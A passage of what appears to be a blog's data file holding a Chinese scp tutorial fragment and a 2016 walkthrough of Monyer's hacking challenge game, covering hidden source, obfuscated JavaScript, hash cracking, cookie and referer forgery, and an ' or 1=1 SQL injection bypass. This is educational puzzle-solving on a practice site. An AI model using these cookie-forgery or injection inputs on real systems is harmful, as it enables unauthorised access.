/opt/soft/</div></pre></td></tr></table></figure></p>\n<p>说明：从10.6.159.147机器上的/opt/soft/中下载test目录到本地的/opt/soft/目录来。</p>\n<p>实例3：上传本地文件到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp /opt/soft/demo.tar root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：复制本地opt/soft/目录下的文件demo.tar 到远程机器10.6.159.147的opt/soft/scptest目录</p>\n<p>实例4：上传本地目录到远程机器指定目录<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">scp -r /opt/soft/<span class=\"built_in\">test</span> root@10.6.159.147:/opt/soft/scptest</div></pre></td></tr></table></figure></p>\n<p>说明：上传本地目录 /opt/soft/test到远程机器10.6.159.147上/opt/soft/scptest的目录中</p>"},{"title":"再玩Monyer的Hack Game","date":"2016-11-23T19:15:20.000Z","_content":"\n之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。\n\n<!-- more -->\n\n# 第零关\n\nhttp://monyer.com/game/game1/\n\n> 请点击链接进入第1关： 连接在左边→ ←连接在右边\n\n可是我们看不到链接地址，直接打开审查工具。\n\n```html\n<span>连接在左边→</span>\n<a href=\"first.php\"></a>\n<span>←连接在右边</span>\n```\n好的输入地址，我么进入第一关\n\n# 第一关\n\nhttp://monyer.com/game/game1/first.php\n\n打开页面依然是什么都没有，这很正常。审查工具看代码。\n\n```html\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    function check(){\n        if(document.getElementById('txt').value==\"  \"){\n            window.location.href=\"hello.php\";\n        }else{\n            alert(\"密码错误\");\n        }\n    }\n</script>\n```\n\n好了 我们知道密码了，并且知道下一关的文件是hello.php\n\n# 第二关\n\nhttp://monyer.com/game/game1/hello.php\n\n审查工具看源代码，head中\n\n```html\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    document.oncontextmenu=function(){return false};\n\n    var a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d /c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n\n    function check(){\n        if(document.getElementById(\"txt\").value==a){\n            window.location.href=a + \".php\";\n        }else{\n            alert(\"密码错误\");\n            return false;\n        }\n    }\n</script>\n```\n\n现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入\n```javascript\nvar a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d /c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n    \n424178\n```\n好的我们知道a的值是424178，输入，进入下一关\n\n# 第三关\n\nhttp://monyer.com/game/game1/424178.php\n\nhead中存在js\n\n```javascript\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));\n</script>\n```\n\n新时代无须解释，直接上chrome consle\n```javascript\nString.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125)\n```\n输出为\n```javascript\nfunction check(){\n\tvar a = 'd4g';\n\tif(document.getElementById('txt').value==a){\n\t\twindow.location.href=a+\".php\";\n\t}else{\n\t\talert(\"密码错误\");\n\t}\n}\n```\n好了我们知道了，密码是d4g，下一关！\n\n# 第四关\n\nhttp://monyer.com/game/game1/d4g.php\n\n这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。\n打开后立即按esc停止。\n\n```javascript\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}))\n</script>\n```\n\n显然这是一个加密的js，我们需要解密，上解密工具：\n\nhttp://tool.lu/js/\n\n解密后：\n\n```javascript\na = \"3bhe\";\n\nfunction check() {\n\tif (document.getElementById('txt').value == a) {\n\t\twindow.location.href = a + \".php\"\n\t} else {\n\t\talert(\"密码错误\")\n\t}\n}\n```\n密码是 3bhe 下一关\n\n诶？怎么不对？仔细检查源代码发现下面还有一行\n```javascript\neval(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n```\n解密！\n```javascript\na = a.toUpperCase() + 1;\n```\n.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go\n\n# 第五关\nhttp://monyer.com/game/game1/3BHE1.php\n\n> 密码在哪儿？额，我藏在页面里了哦！\n\n这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？\n\n找到了，在cookie里\n\n```\nmonyer:the password for the next level is asdf\n```\n\n下一关！\n\n# 第六关\n\nhttp://monyer.com/game/game1/asdf.php\n\n是个线索题目\n\nGet the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls ...\n\n真蛋疼\n把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。\n\n这个答案是；seventeen\n\n# 第七关\n\nhttp://monyer.com/game/game1/seventeen7.php\n\n社工题\n\n先解密md5吧\n\n5e023995fb3f5e840ee684784f8f0799\n\nhttp://www.somd5.com/\n\n解密出  eighteen8\n\n下一关\n\n# 第八关\n\nhttp://monyer.com/game/game1/eighteen8.php\n\n直接看到 一个404 不要着急 审查工具\n\n```\n<p style=\"display:none\">\n第8关\n朋友您好，第8关欢迎您！\n我对您的聪明才智感到惊讶！\n相信我，现在世界上85%以上的人都在你之下，\n所以你可以大步向前，义无反顾地进行你的事业了。\n因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。\n那么继续我们的约定，我将告诉你第9关的入口：\n10000以内所有质数和.php\n</p>\n```\n10000以内所有质数和，so easy！写个javascript 算一下。\n\n```\nvar sum = 0;\nfor (var i = 2; i < 10000; i++) {\n\tvar flag = true;\n\tfor (var j = 2; j <= Math.sqrt(i); j++) {\n\t\tif (i % j == 0) flag = false ;\n\t}\n    if(flag) {sum = sum + i;}\n}\nconsole.log(sum);\n\n5736396\n```\n下一关\n\n# 第九关\n\nhttp://monyer.com/game/game1/5736396.php\n\n在命令行里输入：\n```\nwget http://monyer.com/game/game1/img/4681851790659554.jpg\ncat 4681851790659554.jpg\n```\n密码藏在图片里\n```\n���^�v��*{I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����\n�Ǿ���ʽ�ʲô���ţ�\n�ԣ�������������������......��\n��ϲ�㣡\n��ʮ������Ϊ��MonyerLikeYou_the10level\n�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�\n�����Լ���û��ģ�%\n```\nMonyerLikeYou_the10level\n\n# 第十关\n\nhttp://monyer.com/game/game1/MonyerLikeYou_the10level.php\n\n> 当前用户身份为simpleuser 不是admin，无法显示下一关密码\n\n很显然这是一道session/cookie欺骗题\n\n在console里直接输入\n```\ndocument.cookie=\"username=admin\"\n```\n\n刷新\n>好聪明哦！下一关密码为：doyouknow\n\n下一关！\n\n# 第十一关\nhttp://monyer.com/game/game1/doyouknow.php?action=show_login_false\n\n>你的session不是passer，不能查看下一关密码\n\n在console里直接输入\n```\ndocument.cookie=\"username=passer\"\n```\n\n刷新，好像不对哦，monyer骗我，哼！\n\n再看标题 action=show_login_false \n\nhttp://monyer.com/game/game1/doyouknow.php?action=show_login_true\n\n> 您的session为passer，所以您可以查看下一关密码：smartboy\n\n下一关！\n\n# 第十二关\n\nhttp://monyer.com/game/game1/smartboy.php\n\n```\nJTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3\n```\n直觉告诉我，这显然是Base64 解密\n```\n%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77\n```\n直觉告诉我，这显然是 UrlEncode 解密\n\nJTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw\n\n直觉再次告诉我，这显然是 Base64 解密\n\n%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70\n\n直觉再次告诉我，这显然是  UrlEncode 解密\n\nsobeautiful.php\n\n不错 密码就是sobeautiful\n\n\n# 第十三关\nhttp://monyer.com/game/game1/sobeautiful.php\n\n> 本页禁止盗链！\n\nwtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：\n\n```html\n<a href= \"http://monyer.com/game/game1/sobeautiful.php\"> 简便伪造referer</a>\n```\n>欢迎您来到第13关\n>\n>请输入密码进入第14关：\n>\n>没有输入密码 或 密码错误 或 系统错误！\n\n看源代码有post提交\n\n这是一道SQL 注入题\n\n试试我大万能密码！ \n```\n' or 1=1 \n```\n万能密码熟记于心\n\n>下一关密码：whatyouneverknow\n\n下一关！\n\n# 第十四关\n\nhttp://monyer.com/game/game1/whatyouneverknow.php\n\n感谢@Echowxsy提供第14关解密过程\n\n![](/content/images/monyerhack/01.jpg)\n\n![](/content/images/monyerhack/02.jpg)\n\n![](/content/images/monyerhack/03.jpg)\n\n![](/content/images/monyerhack/1.jpg)\n\n![](/content/images/monyerhack/2.jpg)\n\n![](/content/images/monyerhack/3.jpg)\n\n![](/content/images/monyerhack/5.jpg)\n\n# 第十五关\n\n![](/content/images/monyerhack/4.png)\n\n\n\n\n\n\n","source":"_posts/再玩Monyer的Hack-Game.md","raw":"---\ntitle: 再玩Monyer的Hack Game\ndate: 2016-11-23 19:15:20\ntags: hack \ncategories: hack\n---\n\n之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。\n\n<!-- more -->\n\n# 第零关\n\nhttp://monyer.com/game/game1/\n\n> 请点击链接进入第1关： 连接在左边→ ←连接在右边\n\n可是我们看不到链接地址，直接打开审查工具。\n\n```html\n<span>连接在左边→</span>\n<a href=\"first.php\"></a>\n<span>←连接在右边</span>\n```\n好的输入地址，我么进入第一关\n\n# 第一关\n\nhttp://monyer.com/game/game1/first.php\n\n打开页面依然是什么都没有，这很正常。审查工具看代码。\n\n```html\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    function check(){\n        if(document.getElementById('txt').value==\"  \"){\n            window.location.href=\"hello.php\";\n        }else{\n            alert(\"密码错误\");\n        }\n    }\n</script>\n```\n\n好了 我们知道密码了，并且知道下一关的文件是hello.php\n\n# 第二关\n\nhttp://monyer.com/game/game1/hello.php\n\n审查工具看源代码，head中\n\n```html\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    document.oncontextmenu=function(){return false};\n\n    var a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d /c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n\n    function check(){\n        if(document.getElementById(\"txt\").value==a){\n            window.location.href=a + \".php\";\n        }else{\n            alert(\"密码错误\");\n            return false;\n        }\n    }\n</script>\n```\n\n现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入\n```javascript\nvar a,b,c,d,e,f,g;\n    a = 3.14;\n    b = a * 2;\n    c = a + b;\n    d = c / b + a;\n    e = c - d * b + a;\n    f = e + d /c -b * a;\n    g = f * e - d + c * b + a;\n    a = g * g;\n    a = Math.floor(a);\n    \n424178\n```\n好的我们知道a的值是424178，输入，进入下一关\n\n# 第三关\n\nhttp://monyer.com/game/game1/424178.php\n\nhead中存在js\n\n```javascript\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125));\n</script>\n```\n\n新时代无须解释，直接上chrome consle\n```javascript\nString.fromCharCode(102,117,110,99,116,105,111,110,32,99,104,101,99,107,40,41,123,13,10,09,118,97,114,32,97,32,61,32,39,100,52,103,39,59,13,10,09,105,102,40,100,111,99,117,109,101,110,116,46,103,101,116,69,108,101,109,101,110,116,66,121,73,100,40,39,116,120,116,39,41,46,118,97,108,117,101,61,61,97,41,123,13,10,09,09,119,105,110,100,111,119,46,108,111,99,97,116,105,111,110,46,104,114,101,102,61,97,43,34,46,112,104,112,34,59,13,10,09,125,101,108,115,101,123,13,10,09,09,97,108,101,114,116,40,34,23494,30721,38169,35823,34,41,59,13,10,09,125,13,10,125)\n```\n输出为\n```javascript\nfunction check(){\n\tvar a = 'd4g';\n\tif(document.getElementById('txt').value==a){\n\t\twindow.location.href=a+\".php\";\n\t}else{\n\t\talert(\"密码错误\");\n\t}\n}\n```\n好了我们知道了，密码是d4g，下一关！\n\n# 第四关\n\nhttp://monyer.com/game/game1/d4g.php\n\n这一关非常猥琐，页面会自动跳转，稍有不注意，就跳走了。\n打开后立即按esc停止。\n\n```javascript\n<script type=\"text/rocketscript\" data-rocketoptimized=\"true\">\n    eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--)d[c.toString(a)]=k[c]||c.toString(a);k=[function(e){return d[e]}];e=function(){return'\\\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\\\b'+e(c)+'\\\\b','g'),k[c]);return p}('a=\"e\";d c(){b(9.8(\\'7\\').6==a){5.4.3=a+\".2\"}1{0(\"密码错误\")}}',15,15,'alert|else|php|href|location|window|value|txt|getElementById|document||if|check|function|3bhe'.split('|'),0,{}))\n</script>\n```\n\n显然这是一个加密的js，我们需要解密，上解密工具：\n\nhttp://tool.lu/js/\n\n解密后：\n\n```javascript\na = \"3bhe\";\n\nfunction check() {\n\tif (document.getElementById('txt').value == a) {\n\t\twindow.location.href = a + \".php\"\n\t} else {\n\t\talert(\"密码错误\")\n\t}\n}\n```\n密码是 3bhe 下一关\n\n诶？怎么不对？仔细检查源代码发现下面还有一行\n```javascript\neval(\"\\141\\75\\141\\56\\164\\157\\125\\160\\160\\145\\162\\103\\141\\163\\145\\50\\51\\53\\61\\73\");\n```\n解密！\n```javascript\na = a.toUpperCase() + 1;\n```\n.toUpperCase()是转换大写，所以密码是 3BHE1 下一关 go\n\n# 第五关\nhttp://monyer.com/game/game1/3BHE1.php\n\n> 密码在哪儿？额，我藏在页面里了哦！\n\n这题的难点在于 找到不密码藏在哪里了 搜索了个遍 就是找不到密码 看看http头呢？\n\n找到了，在cookie里\n\n```\nmonyer:the password for the next level is asdf\n```\n\n下一关！\n\n# 第六关\n\nhttp://monyer.com/game/game1/asdf.php\n\n是个线索题目\n\nGet the latest fashion, beauty, dating, and health tips. Plus, win freebies, take quizzes, and check your daily horoscope! Girl Games - 9000+ Free Games for Girls ...\n\n真蛋疼\n把这个线索在网上一搜 第一个已经是一个结题方案了，看来monyer的游戏已经成功干过一个网站了。\n\n这个答案是；seventeen\n\n# 第七关\n\nhttp://monyer.com/game/game1/seventeen7.php\n\n社工题\n\n先解密md5吧\n\n5e023995fb3f5e840ee684784f8f0799\n\nhttp://www.somd5.com/\n\n解密出  eighteen8\n\n下一关\n\n# 第八关\n\nhttp://monyer.com/game/game1/eighteen8.php\n\n直接看到 一个404 不要着急 审查工具\n\n```\n<p style=\"display:none\">\n第8关\n朋友您好，第8关欢迎您！\n我对您的聪明才智感到惊讶！\n相信我，现在世界上85%以上的人都在你之下，\n所以你可以大步向前，义无反顾地进行你的事业了。\n因为只要你肯努力，不畏惧挫折，这个世界上没有难倒你的事。\n那么继续我们的约定，我将告诉你第9关的入口：\n10000以内所有质数和.php\n</p>\n```\n10000以内所有质数和，so easy！写个javascript 算一下。\n\n```\nvar sum = 0;\nfor (var i = 2; i < 10000; i++) {\n\tvar flag = true;\n\tfor (var j = 2; j <= Math.sqrt(i); j++) {\n\t\tif (i % j == 0) flag = false ;\n\t}\n    if(flag) {sum = sum + i;}\n}\nconsole.log(sum);\n\n5736396\n```\n下一关\n\n# 第九关\n\nhttp://monyer.com/game/game1/5736396.php\n\n在命令行里输入：\n```\nwget http://monyer.com/game/game1/img/4681851790659554.jpg\ncat 4681851790659554.jpg\n```\n密码藏在图片里\n```\n���^�v��*{I�z��^�iؾSRW�V�6�Z��(����H�����ٹ�����\n�Ǿ���ʽ�ʲô���ţ�\n�ԣ�������������������......��\n��ϲ�㣡\n��ʮ������Ϊ��MonyerLikeYou_the10level\n�����ڿ�ʼ�漰������Ķ�̬���������㶼���԰���ʾ������ɵģ�\n�����Լ���û��ģ�%\n```\nMonyerLikeYou_the10level\n\n# 第十关\n\nhttp://monyer.com/game/game1/MonyerLikeYou_the10level.php\n\n> 当前用户身份为simpleuser 不是admin，无法显示下一关密码\n\n很显然这是一道session/cookie欺骗题\n\n在console里直接输入\n```\ndocument.cookie=\"username=admin\"\n```\n\n刷新\n>好聪明哦！下一关密码为：doyouknow\n\n下一关！\n\n# 第十一关\nhttp://monyer.com/game/game1/doyouknow.php?action=show_login_false\n\n>你的session不是passer，不能查看下一关密码\n\n在console里直接输入\n```\ndocument.cookie=\"username=passer\"\n```\n\n刷新，好像不对哦，monyer骗我，哼！\n\n再看标题 action=show_login_false \n\nhttp://monyer.com/game/game1/doyouknow.php?action=show_login_true\n\n> 您的session为passer，所以您可以查看下一关密码：smartboy\n\n下一关！\n\n# 第十二关\n\nhttp://monyer.com/game/game1/smartboy.php\n\n```\nJTRBJTU0JTYzJTdBJTRBJTU0JTVBJTQ3JTRBJTU0JTU5JTc5JTRBJTU0JTU5JTMxJTRBJTU0JTU5JTc4JTRBJTU0JTYzJTMxJTRBJTU0JTYzJTMwJTRBJTU0JTU5JTM1JTRBJTU0JTU5JTMyJTRBJTU0JTYzJTMxJTRBJTU0JTVBJTQ0JTRBJTU0JTRBJTQ2JTRBJTU0JTYzJTc3JTRBJTU0JTU5JTM0JTRBJTU0JTYzJTc3\n```\n直觉告诉我，这显然是Base64 解密\n```\n%4A%54%63%7A%4A%54%5A%47%4A%54%59%79%4A%54%59%31%4A%54%59%78%4A%54%63%31%4A%54%63%30%4A%54%59%35%4A%54%59%32%4A%54%63%31%4A%54%5A%44%4A%54%4A%46%4A%54%63%77%4A%54%59%34%4A%54%63%77\n```\n直觉告诉我，这显然是 UrlEncode 解密\n\nJTczJTZGJTYyJTY1JTYxJTc1JTc0JTY5JTY2JTc1JTZDJTJFJTcwJTY4JTcw\n\n直觉再次告诉我，这显然是 Base64 解密\n\n%73%6F%62%65%61%75%74%69%66%75%6C%2E%70%68%70\n\n直觉再次告诉我，这显然是  UrlEncode 解密\n\nsobeautiful.php\n\n不错 密码就是sobeautiful\n\n\n# 第十三关\nhttp://monyer.com/game/game1/sobeautiful.php\n\n> 本页禁止盗链！\n\nwtf..显然他判断了http来源，需要伪造http referer，那么我们在之前的第十二关的审查代码中加入：\n\n```html\n<a href= \"http://monyer.com/game/game1/sobeautiful.php\"> 简便伪造referer</a>\n```\n>欢迎您来到第13关\n>\n>请输入密码进入第14关：\n>\n>没有输入密码 或 密码错误 或 系统错误！\n\n看源代码有post提交\n\n这是一道SQL 注入题\n\n试试我大万能密码！ \n```\n' or 1=1 \n```\n万能密码熟记于心\n\n>下一关密码：whatyouneverknow\n\n下一关！\n\n# 第十四关\n\nhttp://monyer.com/game/game1/whatyouneverknow.php\n\n感谢@Echowxsy提供第14关解密过程\n\n![](/content/images/monyerhack/01.jpg)\n\n![](/content/images/monyerhack/02.jpg)\n\n![](/content/images/monyerhack/03.jpg)\n\n![](/content/images/monyerhack/1.jpg)\n\n![](/content/images/monyerhack/2.jpg)\n\n![](/content/images/monyerhack/3.jpg)\n\n![](/content/images/monyerhack/5.jpg)\n\n# 第十五关\n\n![](/content/images/monyerhack/4.png)\n\n\n\n\n\n\n","slug":"再玩Monyer的Hack-Game","published":1,"updated":"2016-11-25T10:59:27.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"civym300y000xcdone9gmir4j","content":"<p>之前混百度空间混久了，认识很多大牛，不乏monyer大牛。很早很早以前，他做了一个黑客小游戏，当时还不太会玩，现在突然打开发现，网站竟然还活着，决定重温经典。</p>\n<a id=\"more\"></a>\n<h1 id=\"第零关\"><a href=\"#第零关\" class=\"headerlink\" title=\"第零关\"></a>第零关</h1><p><a href=\"http://monyer.com/game/game1/\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/</a></p>\n<blockquote>\n<p>请点击链接进入第1关： 连接在左边→ ←连接在右边</p>\n</blockquote>\n<p>可是我们看不到链接地址，直接打开审查工具。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>连接在左边→<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"first.php\"</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></div><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">span</span>&gt;</span>←连接在右边<span class=\"tag\">&lt;/<span class=\"name\">span</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>好的输入地址，我么进入第一关</p>\n<h1 id=\"第一关\"><a href=\"#第一关\" class=\"headerlink\" title=\"第一关\"></a>第一关</h1><p><a href=\"http://monyer.com/game/game1/first.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/first.php</a></p>\n<p>打开页面依然是什么都没有，这很正常。审查工具看代码。</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/rocketscript\"</span> <span class=\"attr\">data-rocketoptimized</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"undefined\"></span></div><div class=\"line\">    function check()&#123;</div><div class=\"line\">        if(document.getElementById('txt').value==\"  \")&#123;</div><div class=\"line\">            window.location.href=\"hello.php\";</div><div class=\"line\">        &#125;else&#123;</div><div class=\"line\">            alert(\"密码错误\");</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>好了 我们知道密码了，并且知道下一关的文件是hello.php</p>\n<h1 id=\"第二关\"><a href=\"#第二关\" class=\"headerlink\" title=\"第二关\"></a>第二关</h1><p><a href=\"http://monyer.com/game/game1/hello.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/hello.php</a></p>\n<p>审查工具看源代码，head中</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">script</span> <span class=\"attr\">type</span>=<span class=\"string\">\"text/rocketscript\"</span> <span class=\"attr\">data-rocketoptimized</span>=<span class=\"string\">\"true\"</span>&gt;</span><span class=\"undefined\"></span></div><div class=\"line\">    document.oncontextmenu=function()&#123;return false&#125;;</div><div class=\"line\"></div><div class=\"line\">    var a,b,c,d,e,f,g;</div><div class=\"line\">    a = 3.14;</div><div class=\"line\">    b = a * 2;</div><div class=\"line\">    c = a + b;</div><div class=\"line\">    d = c / b + a;</div><div class=\"line\">    e = c - d * b + a;</div><div class=\"line\">    f = e + d /c -b * a;</div><div class=\"line\">    g = f * e - d + c * b + a;</div><div class=\"line\">    a = g * g;</div><div class=\"line\">    a = Math.floor(a);</div><div class=\"line\"></div><div class=\"line\">    function check()&#123;</div><div class=\"line\">        if(document.getElementById(\"txt\").value==a)&#123;</div><div class=\"line\">            window.location.href=a + \".php\";</div><div class=\"line\">        &#125;else&#123;</div><div class=\"line\">            alert(\"密码错误\");</div><div class=\"line\">            return false;</div><div class=\"line\">        &#125;</div><div class=\"line\">    &#125;</div><div class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></div></pre></td></tr></table></figure>\n<p>现在是2016年了，我们不需要手算和计算器了。直接在chrome的console里输入<br><figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">var</span> a,b,c,d,e,f,g;</div><div class=\"line\">    a = <span class=\"number\">3.14</span>;</div><div class=\"line\">    b = a * <span class=\"number\">2</span>;</div><div class=\"line\">    c = a + b;</div><div class=\"line\">    d = c / b + a;</div><div class=\"line\">    e = c - d * b + a;</div><div class=\"line\">    f = e + d /c -b * a;</div><div class=\"line\">    g = f * e - d + c * b + a;</div><div class=\"line\">    a = g * g;</div><div class=\"line\">    a = <span class=\"built_in\">Math</span>.floor(a);</div><div class=\"line\">    </div><div class=\"line\"><span class=\"number\">424178</span></div></pre></td></tr></table></figure></p>\n<p>好的我们知道a的值是424178，输入，进入下一关</p>\n<h1 id=\"第三关\"><a href=\"#第三关\" class=\"headerlink\" title=\"第三关\"></a>第三关</h1><p><a href=\"http://monyer.com/game/game1/424178.php\" target=\"_blank\" rel=\"external\">http://monyer.com/game/game1/424178.php</a></p>\n<p>head中存在js</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">&lt;script type=<span class=\"string\">\"text/rocketscript\"</span> data-rocketoptimized=<span class=\"string\">\"true\"</span>&gt;</div><div class=\"line\">    <span class=\"built_in\">eval</span>(<span class=\"built_in\">String</span>.fromCharCode(<span class=\"number\">102</span>,<span class=\"number\">117</span>,<span class=\"number\">110</span>,<span class=\"number\">99</span>,<span class=\"number\">116</span>,<span 